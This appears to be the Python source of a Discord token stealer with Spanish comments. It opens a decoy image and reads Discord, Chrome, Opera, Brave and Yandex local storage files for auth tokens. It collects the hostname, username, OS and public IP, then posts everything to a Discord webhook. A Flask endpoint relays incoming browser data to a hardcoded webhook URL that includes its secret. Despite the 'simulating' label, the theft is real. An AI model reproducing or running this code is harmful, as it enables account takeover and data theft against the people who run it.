import os
import re
import time
import socket
import platform
from PIL import Image
import requests
from flask import Flask, request

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1360813090098122913/BW90Lv2Z2rKvNKl5fCChCECvJbtgwoamIVKfh7CYlACRnHDjKtICaU_KVA-93D_9efiI"

def get_ip():
    try:
        return requests.get("https://api.ipify.org").text
    except:
        return "IP no disponible"

def get_system_info():
    return {
        "PC": socket.gethostname(),
        "Usuario": os.getlogin(),
        "Sistema Operativo": platform.system(),
        "Versión SO": platform.version(),
        "Arquitectura": platform.machine(),
        "IP Pública": get_ip()
    }

def find_tokens():
    paths = {
        "Discord": os.path.join(os.getenv("APPDATA", ""), "Discord"),
        "Discord Canary": os.path.join(os.getenv("APPDATA", ""), "discordcanary"),
        "Discord PTB": os.path.join(os.getenv("APPDATA", ""), "discordptb"),
        "Google Chrome": os.path.join(os.getenv("LOCALAPPDATA", ""), "Google", "Chrome", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA", ""), "Opera Software", "Opera Stable"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA", ""), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA", ""), "Yandex", "YandexBrowser", "User Data", "Default"),
    }

    token_regex = re.compile(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}")
    tokens = []

    for platform_name, path in paths.items():
        leveldb_path = os.path.join(path, "Local Storage", "leveldb")
        if not os.path.exists(leveldb_path):
            continue

        for filename in os.listdir(leveldb_path):
            if not filename.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(leveldb_path, filename), "r", errors="ignore") as file:
                    content = file.read()
                    found_tokens = token_regex.findall(content)
                    for token in found_tokens:
                        tokens.append((platform_name, token))
            except Exception:
                continue

    return tokens

def simulate_extraction(webhook, image_path):
    # Mostrar imagen
    try:
        img = Image.open(image_path)
        img.show()
    except Exception as e:
        print(f"No se pudo abrir la imagen: {e}")

    print("\n[+] Simulando extracción de datos...\n")
    time.sleep(1)

    # Obtener datos
    info = get_system_info()
    tokens = find_tokens()

    # Crear texto
    text = "**Información del Sistema:**\n"
    for key, value in info.items():
        text += f"> `{key}: {value}`\n"

    text += "\n**Tokens Encontrados:**\n"
    if tokens:
        for plataforma, token in tokens:
            text += f"> `{plataforma}`: `{token}`\n"
    else:
        text += "> No se encontraron tokens.\n"

    # Enviar al webhook
    try:
        requests.post(webhook, json={"content": text})
        print("\nInformación enviada al webhook.")
    except Exception as e:
        print(f"\nError al enviar al webhook: {e}")

@app.route('/webhook', methods=['POST'])
def recibir_datos():
    data = request.json

    contenido = (
        "**Datos del navegador:**\n"
        f"> Navegador: {data.get('navegador')}\n"
        f"> Idioma: {data.get('idioma')}\n"
        f"> Plataforma: {data.get('plataforma')}\n"
        f"> IP: {data.get('ip')}\n"
    )

    try:
        requests.post(WEBHOOK_URL, json={"content": contenido})
        return {"status": "enviado"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
